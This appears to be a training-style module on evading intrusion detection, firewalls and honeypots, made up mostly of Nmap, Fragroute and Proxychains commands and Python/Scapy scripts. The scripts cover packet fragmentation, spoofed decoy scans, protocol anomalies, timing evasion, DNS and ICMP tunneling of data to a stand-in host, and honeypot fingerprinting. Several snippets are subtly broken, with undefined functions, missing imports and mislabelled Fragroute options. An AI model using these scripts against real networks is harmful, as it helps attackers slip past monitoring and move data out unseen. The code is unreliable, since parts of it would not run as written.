# Evading IDS, Firewall and HoneyPots - Topics Overview

## Topic Explanation
Intrusion Detection Systems (IDS), Firewalls, and Honeypots are critical security technologies designed to detect, prevent, and analyze malicious activities. This module covers various techniques attackers use to evade these security controls including packet manipulation, protocol-level evasion, timing attacks, encryption, tunneling, and anti-forensics techniques. Understanding these evasion methods is essential for security professionals to improve their defensive strategies and properly configure security systems to detect sophisticated attacks.

## Articles for Further Reference
- [NIST Special Publication 800-94: Guide to Intrusion Detection and Prevention Systems](https://csrc.nist.gov/publications/detail/sp/800-94/final)
- [SANS Institute: IDS Evasion Techniques](https://www.sans.org/white-papers/37543/)
- [Firewall Evasion Techniques - OWASP](https://owasp.org/www-community/attacks/Firewall_Evasion)
- [Honeypot Detection and Evasion](https://www.sans.org/white-papers/36777/)

## Reference Links
- [Snort IDS Documentation](https://www.snort.org/documents)
- [Suricata IDS/IPS](https://suricata-ids.org/)
- [pfSense Firewall](https://www.pfsense.org/)
- [The Honeynet Project](https://www.honeynet.org/)

## Available Tools for the Topic

### Tool Name: Nmap
**Description:** Network scanning tool with various evasion techniques built-in for avoiding detection by firewalls and IDS systems.

**Example Usage:**
```bash
# Stealth SYN scan
nmap -sS target-ip

# Fragment packets to evade detection
nmap -f target-ip

# Decoy scanning
nmap -D decoy1,decoy2,ME target-ip

# Slow timing to avoid detection
nmap -T1 target-ip

# Source port spoofing
nmap --source-port 53 target-ip
```

### Tool Name: Fragroute
**Description:** Network packet interception and modification tool for testing firewall and IDS evasion.

**Example Usage:**
```bash
# Fragment packets
fragroute -f "ip_frag 8" target-ip

# Duplicate packets
fragroute -f "tcp_seg 8 new" target-ip

# Delay packets
fragroute -f "delay 1000" target-ip
```

### Tool Name: Proxychains
**Description:** Tool for routing traffic through proxy servers to hide the source of attacks.

**Example Usage:**
```bash
# Route through SOCKS proxy
proxychains nmap target-ip

# Route through multiple proxies
proxychains curl http://target-site.com

# Configure proxy chain
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
```

## All Possible Payloads for Manual Approach

### Packet Fragmentation Evasion
```python
from scapy.all import *

# IP fragmentation evasion
def fragment_evasion(target_ip, payload):
    # Split payload into fragments
    packet = IP(dst=target_ip)/TCP(dport=80)/payload
    fragments = fragment(packet, fragsize=8)
    
    for frag in fragments:
        send(frag)

# Overlapping fragments
def overlapping_fragments(target_ip):
    # Create overlapping fragments to confuse IDS
    frag1 = IP(dst=target_ip, frag=0)/TCP(dport=80)/"AAAA"
    frag2 = IP(dst=target_ip, frag=1)/TCP()/"BBBB"
    
    send([frag1, frag2])
```

### Protocol-Level Evasion
```bash
# HTTP evasion techniques
# Unicode encoding
curl "http://target.com/%u0041%u0044%u004D%u0049%u004E"

# Double URL encoding  
curl "http://target.com/%2541%2544%254D%2549%254E"

# Parameter pollution
curl "http://target.com/admin?user=admin&user=guest"

# HTTP verb tampering
curl -X TRACE http://target.com/admin
```

### Timing-Based Evasion
```python
import time
import random

def slow_scan_evasion(target_ports):
    for port in target_ports:
        # Random delay between scans
        delay = random.uniform(5, 30)
        time.sleep(delay)
        
        # Perform scan
        scan_port(target_ip, port)

def distributed_timing_attack():
    # Spread attack over time to avoid threshold detection
    for i in range(100):
        time.sleep(random.uniform(60, 300))  # 1-5 minute delays
        send_malicious_packet()
```

## Example Payloads

### 1. Multi-Vector IDS Evasion Framework
```python
#!/usr/bin/env python3
from scapy.all import *
import time
import random

class IDSEvasionFramework:
    def __init__(self, target_ip, target_port=80):
        self.target_ip = target_ip
        self.target_port = target_port
        
    def fragmentation_evasion(self, payload):
        """Use packet fragmentation to evade IDS"""
        print("Executing fragmentation evasion...")
        
        # Create base packet
        packet = IP(dst=self.target_ip)/TCP(dport=self.target_port)/payload
        
        # Fragment into small pieces
        fragments = fragment(packet, fragsize=8)
        
        # Send fragments with random delays
        for frag in fragments:
            send(frag, verbose=0)
            time.sleep(random.uniform(0.1, 0.5))
    
    def decoy_scanning(self, decoy_ips):
        """Use decoy IPs to mask real source"""
        print("Executing decoy scanning...")
        
        # Create scan packets with decoy sources
        for decoy_ip in decoy_ips:
            packet = IP(src=decoy_ip, dst=self.target_ip)/TCP(dport=self.target_port, flags="S")
            send(packet, verbose=0)
            
        # Send real scan packet mixed with decoys
        real_packet = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="S")
        send(real_packet, verbose=0)
    
    def protocol_anomaly_evasion(self):
        """Use protocol anomalies to evade detection"""
        print("Executing protocol anomaly evasion...")
        
        # Invalid TCP flags combination
        packet1 = IP(dst=self.target_ip)/TCP(dport=self.target_port, flags="SF")
        send(packet1, verbose=0)
        
        # Unusual IP options
        packet2 = IP(dst=self.target_ip, options=[IPOption_RR()])/TCP(dport=self.target_port)
        send(packet2, verbose=0)
        
        # Invalid sequence numbers
        packet3 = IP(dst=self.target_ip)/TCP(dport=self.target_port, seq=0xFFFFFFFF)
        send(packet3, verbose=0)

# Example usage
evasion = IDSEvasionFramework("192.168.1.100")
evasion.fragmentation_evasion("GET / HTTP/1.1\r\nHost: target\r\n\r\n")
evasion.decoy_scanning(["10.0.0.1", "10.0.0.2", "10.0.0.3"])
evasion.protocol_anomaly_evasion()
```

### 2. Advanced Firewall Bypass Techniques
```python
#!/usr/bin/env python3
import socket
import struct
import base64

class FirewallBypass:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
    
    def dns_tunneling(self, data):
        """Tunnel data through DNS queries"""
        # Encode data in subdomain
        encoded_data = base64.b64encode(data.encode()).decode()
        dns_query = f"{encoded_data}.tunnel.example.com"
        
        # Send DNS query
        import dns.resolver
        try:
            dns.resolver.resolve(dns_query, 'A')
        except:
            pass  # Expected to fail, data was tunneled
    
    def http_tunneling(self, payload):
        """Tunnel through HTTP CONNECT method"""
        http_request = f"""CONNECT {self.target_host}:{self.target_port} HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
User-Agent: Mozilla/5.0\r
\r
{payload}"""
        
        # Send through proxy
        proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        proxy_socket.connect(("proxy.example.com", 8080))
        proxy_socket.send(http_request.encode())
        response = proxy_socket.recv(1024)
        proxy_socket.close()
        
        return response
    
    def icmp_tunneling(self, data):
        """Tunnel data in ICMP packets"""
        packet = IP(dst=self.target_host)/ICMP()/data
        send(packet, verbose=0)

# Example usage
bypass = FirewallBypass("target.com", 443)
bypass.dns_tunneling("malicious command")
bypass.icmp_tunneling(b"covert data")
```

### 3. Honeypot Detection and Evasion
```python
#!/usr/bin/env python3
import requests
import socket
import time

class HoneypotDetector:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.honeypot_indicators = []
    
    def detect_low_interaction_honeypot(self):
        """Detect low-interaction honeypots"""
        # Test for limited service responses
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.target_ip, 22))
            
            # Send invalid SSH handshake
            sock.send(b"INVALID_SSH_HANDSHAKE\n")
            response = sock.recv(1024)
            
            # Honeypots often respond generically
            if b"SSH" not in response:
                self.honeypot_indicators.append("Abnormal SSH response")
            
            sock.close()
        except:
            pass
    
    def detect_timing_anomalies(self):
        """Detect honeypots through timing analysis"""
        response_times = []
        
        for i in range(10):
            start_time = time.time()
            try:
                response = requests.get(f"http://{self.target_ip}", timeout=5)
                end_time = time.time()
                response_times.append(end_time - start_time)
            except:
                pass
        
        # Honeypots often have consistent response times
        if response_times:
            avg_time = sum(response_times) / len(response_times)
            variance = sum((t - avg_time) ** 2 for t in response_times) / len(response_times)
            
            if variance < 0.01:  # Very low variance
                self.honeypot_indicators.append("Suspiciously consistent response times")
    
    def is_honeypot(self):
        """Determine if target is likely a honeypot"""
        self.detect_low_interaction_honeypot()
        self.detect_timing_anomalies()
        
        return len(self.honeypot_indicators) > 0

# Example usage
detector = HoneypotDetector("192.168.1.100")
if detector.is_honeypot():
    print("Honeypot detected - avoiding target")
    print("Indicators:", detector.honeypot_indicators)
else:
    print("Target appears legitimate")
```